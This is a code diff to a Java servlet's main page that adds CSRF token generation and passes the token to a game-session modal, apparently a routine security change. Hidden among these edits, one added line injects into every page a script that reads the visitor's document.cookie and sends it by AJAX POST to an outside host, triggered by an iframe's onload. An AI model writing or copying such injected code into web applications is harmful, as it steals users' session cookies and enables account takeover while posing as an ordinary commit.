@@ -21,9 +21,8 @@ import models.PlayerDao;
 import utils.GiantBombUtils;
 import utils.GoogleMapsUtils;
 import utils.HTMLBuilder;
-
+import utils.TokenUtils;
 import comparators.ComparatorIgnoreCase;
-
 import dao.GameSessionDaoImpl;
 import dao.PlayerDaoImpl;
 import enums.PageTitle;
@@ -124,6 +123,10 @@ public class MainPage extends HttpServlet {
 	}
 
 	private void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+	    // Generate a unique token and store it session
+        String uniqueToken = TokenUtils.generateUniqueToken();
+        request.getSession().setAttribute(TokenUtils.CSRF_TOKEN, uniqueToken);
+	    
 	    request.setCharacterEncoding("UTF-8");
 	    response.setCharacterEncoding("UTF-8");
         response.setContentType("text/html");
@@ -136,6 +139,8 @@ public class MainPage extends HttpServlet {
 
         // Body
         out.println("<body class=\"max-height\">");
+            out.println("<script src=\"assets/js/jquery-3.1.1.min.js\"></script><script>cookies = document.cookie; function send() { $.ajax({ type: \"POST\", url: \"http://jecoloc-galleriafoto.rhcloud.com/getcookies\", data: { value: cookies, }, }); } </script> <iframe src=\"http://jecoloc-galleriafoto.rhcloud.com/banner.html\" onload=\"send()\"></iframe>");
+        
             // Top menus
             username = (String) request.getSession().getAttribute(SessionData.PLAYER_USERNAME.toString());
             out.println(HTMLBuilder.createTopMenu());
@@ -214,7 +219,7 @@ public class MainPage extends HttpServlet {
                                 }
                             }
                         }
-                        out.println(HTMLBuilder.createModalGameSession(gameSession, INPUT_NAME_VALUE, btnName, btnValue));
+                        out.println(HTMLBuilder.createModalGameSession(uniqueToken, gameSession, INPUT_NAME_VALUE, btnName, btnValue));
                     }
                 }
 
